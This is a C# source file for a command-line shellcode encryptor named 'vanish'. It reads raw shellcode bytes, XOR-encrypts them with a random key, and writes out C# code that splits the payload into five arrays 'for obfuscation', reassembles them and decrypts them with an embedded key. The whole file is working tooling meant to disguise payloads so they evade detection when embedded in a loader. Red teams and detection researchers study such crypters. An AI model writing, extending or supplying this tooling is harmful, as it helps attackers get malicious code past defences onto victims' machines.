using System;
using System.IO;
using System.Text;

namespace vanish
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: ShellcodeEncryptor <path_to_shellcode_file>");
                Console.WriteLine("The shellcode file should contain bytes in the format: 0xfc,0x48,0x83,...");
                return;
            }

            try
            {
                string filePath = args[0];
                string shellcodeText = File.ReadAllText(filePath);

                // Parse the shellcode bytes
                byte[] shellcodeBytes = ParseShellcode(shellcodeText);

                // Generate a random XOR key
                byte[] xorKey = GenerateXorKey(16); // 16-byte key

                // Encrypt the shellcode
                byte[] encryptedShellcode = XorEncrypt(shellcodeBytes, xorKey);

                // Generate output code
                string output = GenerateOutputCode(encryptedShellcode, xorKey, shellcodeBytes.Length);

                // Write to file
                string outputPath = Path.Combine(
                    Path.GetDirectoryName(filePath),
                    Path.GetFileNameWithoutExtension(filePath) + "_encrypted.txt");

                File.WriteAllText(outputPath, output);
                Console.WriteLine($"Encrypted shellcode saved to: {outputPath}");
                Console.WriteLine($"Original size: {shellcodeBytes.Length} bytes");
                Console.WriteLine($"Encrypted size: {encryptedShellcode.Length} bytes");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        static byte[] ParseShellcode(string shellcodeText)
        {
            // Remove any whitespace and split by commas
            string[] byteStrings = shellcodeText
                .Replace(" ", "")
                .Replace("\r", "")
                .Replace("\n", "")
                .Replace("{", "")
                .Replace("}", "")
                .Split(',');

            byte[] bytes = new byte[byteStrings.Length];
            for (int i = 0; i < byteStrings.Length; i++)
            {
                string byteStr = byteStrings[i].Trim();
                if (byteStr.StartsWith("0x"))
                    byteStr = byteStr.Substring(2);

                bytes[i] = Convert.ToByte(byteStr, 16);
            }

            return bytes;
        }

        static byte[] GenerateXorKey(int length)
        {
            Random random = new Random();
            byte[] key = new byte[length];
            random.NextBytes(key);
            return key;
        }

        static byte[] XorEncrypt(byte[] data, byte[] key)
        {
            byte[] encrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                encrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return encrypted;
        }

        static string GenerateOutputCode(byte[] encryptedShellcode, byte[] xorKey, int originalLength)
        {
            StringBuilder sb = new StringBuilder();

            sb.AppendLine("// Encrypted Shellcode - XOR Encryption");
            sb.AppendLine($"// Original length: {originalLength} bytes");
            sb.AppendLine($"// Key length: {xorKey.Length} bytes");
            sb.AppendLine();

            sb.AppendLine("private static byte[] GetEncryptedPayload()");
            sb.AppendLine("{");
            sb.AppendLine("    // Split encrypted payload into multiple parts for obfuscation");
            sb.AppendLine();

            // Split into multiple parts
            int partSize = encryptedShellcode.Length / 5;
            for (int i = 0; i < 5; i++)
            {
                int start = i * partSize;
                int end = (i == 4) ? encryptedShellcode.Length : start + partSize;
                int length = end - start;

                sb.AppendLine($"    byte[] part{i + 1} = {{ {FormatByteArray(encryptedShellcode, start, length)} }};");
            }

            sb.AppendLine();
            sb.AppendLine("    // Reassemble with junk operations");
            sb.AppendLine("    byte[] assembled = new byte[part1.Length + part2.Length + part3.Length + part4.Length + part5.Length];");
            sb.AppendLine("    Array.Copy(part1, 0, assembled, 0, part1.Length);");
            sb.AppendLine("    Array.Copy(part2, 0, assembled, part1.Length, part2.Length);");
            sb.AppendLine("    Array.Copy(part3, 0, assembled, part1.Length + part2.Length, part3.Length);");
            sb.AppendLine("    Array.Copy(part4, 0, assembled, part1.Length + part2.Length + part3.Length, part4.Length);");
            sb.AppendLine("    Array.Copy(part5, 0, assembled, part1.Length + part2.Length + part3.Length + part4.Length, part5.Length);");
            sb.AppendLine();
            sb.AppendLine("    return assembled;");
            sb.AppendLine("}");
            sb.AppendLine();

            sb.AppendLine("private static byte[] DecryptWithEmbeddedKey(byte[] encryptedData)");
            sb.AppendLine("{");
            sb.AppendLine("    // Embedded XOR key");
            sb.AppendLine($"    byte[] xorKey = {{ {FormatByteArray(xorKey)} }};");
            sb.AppendLine("    ");
            sb.AppendLine("    // XOR decryption");
            sb.AppendLine("    byte[] decrypted = new byte[encryptedData.Length];");
            sb.AppendLine("    for (int i = 0; i < encryptedData.Length; i++)");
            sb.AppendLine("    {");
            sb.AppendLine("        decrypted[i] = (byte)(encryptedData[i] ^ xorKey[i % xorKey.Length]);");
            sb.AppendLine("    }");
            sb.AppendLine("    ");
            sb.AppendLine("    return decrypted;");
            sb.AppendLine("}");

            return sb.ToString();
        }

        static string FormatByteArray(byte[] bytes, int start = 0, int length = -1)
        {
            if (length == -1) length = bytes.Length;
            StringBuilder sb = new StringBuilder();

            for (int i = start; i < start + length; i++)
            {
                if (i > start) sb.Append(", ");
                sb.Append($"0x{bytes[i]:X2}");
            }

            return sb.ToString();
        }
    }
}